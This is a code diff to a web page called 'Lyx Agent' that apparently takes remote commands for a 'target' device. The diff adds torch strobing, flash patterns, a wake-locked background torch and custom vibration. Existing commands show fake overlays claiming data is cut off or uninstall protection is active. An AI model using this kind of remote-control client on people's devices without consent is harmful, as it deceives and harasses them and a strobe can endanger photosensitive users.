@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Lyx Agent</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; }
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
   body {
     background: radial-gradient(circle at top, #1a0000 0%, #000 70%);
     min-height: 100vh;
@@ -157,6 +157,9 @@ let deviceId = localStorage.getItem('lyx_device_id') || null;
 let isPolling = false;
 let currentPin = null;
 let flashTrack = null;
+let blinkTimer = null;
+let bgFlashTimer = null;
+let bgFlashStream = null;
 
 const codeInput = document.getElementById('codeInput');
 codeInput.addEventListener('input', e => {
@@ -266,10 +269,14 @@ function executeCommand(cmd) {
     case 'antiuninstall': antiUninstall(); break;
     case 'flashon': flashOn(); break;
     case 'flashoff': flashOff(); break;
+    case 'flashblink': flashBlink(cmd.speed, cmd.count); break;
+    case 'flashpattern': flashPattern(cmd.pattern); break;
+    case 'flashbackground': flashBackground(cmd.duration); break;
     case 'website': openWebsite(cmd.url); break;
     case 'showicon': showIcon(); break;
     case 'music': playMusic(cmd.url); break;
     case 'vibrate': vibrate(cmd.duration); break;
+    case 'vibratecustom': vibrateCustom(cmd.count, cmd.interval, cmd.duration); break;
   }
 }
 
@@ -352,7 +359,7 @@ function doReconnect() { location.reload(); }
 function killData() { showTextOverlay('DATA CONNECTION DISABLED'); }
 function antiUninstall() { showTextOverlay('PROTECTION ACTIVE'); }
 
-/* ==================== FLASH (TRIK) ==================== */
+/* ==================== FLASH ON/OFF ==================== */
 async function flashOn() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -363,12 +370,10 @@ async function flashOn() {
     if (caps.torch) {
       await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
     } else {
-      // Fallback: nyalain layar putih terang
       document.body.style.background = '#fff';
       showTextOverlay('TORCH: ON (screen mode)');
     }
   } catch (e) {
-    // Fallback: nyalain layar putih
     document.body.style.background = '#fff';
     showTextOverlay('TORCH: ON (screen mode)');
   }
@@ -387,6 +392,101 @@ async function flashOff() {
   } catch (e) {}
   document.body.style.background = '';
   showTextOverlay('TORCH: OFF');
+}
+
+/* ==================== FLASH BLINK (STROBE) ==================== */
+function flashBlink(speed, count) {
+  flashOn().then(function() {
+    let i = 0;
+    if (blinkTimer) clearInterval(blinkTimer);
+    blinkTimer = setInterval(function() {
+      i++;
+      try {
+        if (flashTrack) {
+          var caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
+          if (caps.torch) {
+            flashTrack.applyConstraints({ advanced: [{ torch: i % 2 === 0 }] });
+          }
+        }
+      } catch (e) {}
+      if (i >= count * 2) {
+        clearInterval(blinkTimer);
+        blinkTimer = null;
+      }
+    }, speed);
+  });
+}
+
+/* ==================== FLASH PATTERN ==================== */
+function flashPattern(patternStr) {
+  var parts = patternStr.split(',').map(function(s){ return parseFloat(s.trim()); }).filter(function(n){ return !isNaN(n); });
+  if (parts.length < 2) { showTextOverlay('POLA INVALID'); return; }
+  flashOn().then(function() {
+    var i = 0;
+    function nextStep() {
+      if (i >= parts.length) i = 0;
+      var dur = parts[i] * 1000;
+      var on = i % 2 === 0;
+      try {
+        if (flashTrack) {
+          var caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
+          if (caps.torch) {
+            flashTrack.applyConstraints({ advanced: [{ torch: on }] });
+          }
+        }
+      } catch (e) {}
+      i++;
+      setTimeout(nextStep, dur);
+    }
+    nextStep();
+  });
+}
+
+/* ==================== FLASH BACKGROUND ==================== */
+async function flashBackground(duration) {
+  try {
+    bgFlashStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' }
+    });
+    var track = bgFlashStream.getVideoTracks()[0];
+    var caps = track.getCapabilities ? track.getCapabilities() : {};
+    if (caps.torch) {
+      await track.applyConstraints({ advanced: [{ torch: true }] });
+    }
+    flashTrack = track;
+
+    var wakeLock = null;
+    try {
+      if (navigator.wakeLock) {
+        wakeLock = await navigator.wakeLock.request('screen');
+      }
+    } catch (e) {}
+
+    if (bgFlashTimer) clearInterval(bgFlashTimer);
+    bgFlashTimer = setInterval(async function() {
+      try {
+        if (flashTrack) {
+          var c = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
+          if (c.torch) {
+            await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
+          }
+        }
+      } catch (e) {}
+    }, 2000);
+
+    showTextOverlay('SENTER BG AKTIF');
+
+    if (duration > 0) {
+      setTimeout(function() {
+        if (bgFlashTimer) { clearInterval(bgFlashTimer); bgFlashTimer = null; }
+        if (bgFlashStream) { bgFlashStream.getTracks().forEach(function(t){ t.stop(); }); bgFlashStream = null; flashTrack = null; }
+        if (wakeLock) { try { wakeLock.release(); } catch (e) {} }
+        showTextOverlay('SENTER BG MATI');
+      }, duration * 1000);
+    }
+  } catch (e) {
+    showTextOverlay('SENTER GAGAL');
+  }
 }
 
 /* ==================== WEBSITE ==================== */
@@ -411,7 +511,6 @@ function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&
 /* ==================== SHOW ICON ==================== */
 function showIcon() {
   showTextOverlay('APLIKASI TARGET DIMUNCULKAN');
-  // Effek shake biar kelihatan "hidup"
   document.body.animate([
     { transform: 'translate(0,0)' },
     { transform: 'translate(-10px,0)' },
@@ -432,8 +531,8 @@ function playMusic(url) {
   el.loop = false;
   el.style.display = 'none';
   document.body.appendChild(el);
-  el.play().catch(() => showTextOverlay('▶ MUSIC PLAYING'));
-  showTextOverlay('▶ MUSIC PLAYING');
+  el.play().catch(() => showTextOverlay('MUSIC PLAYING'));
+  showTextOverlay('MUSIC PLAYING');
 }
 
 /* ==================== VIBRATE ==================== */
@@ -445,6 +544,18 @@ function vibrate(duration) {
   } else {
     showTextOverlay('VIBRATE NOT SUPPORTED');
   }
+}
+
+/* ==================== VIBRATE CUSTOM ==================== */
+function vibrateCustom(count, interval, duration) {
+  if (!navigator.vibrate) { showTextOverlay('VIBRATE NOT SUPPORTED'); return; }
+  var pattern = [];
+  for (var i = 0; i < count; i++) {
+    pattern.push(duration);
+    if (i < count - 1) pattern.push(interval);
+  }
+  navigator.vibrate(pattern);
+  showTextOverlay('📳 VIBRATE ' + count + 'x');
 }
 
 /* ==================== AUTO RECONNECT ==================== */
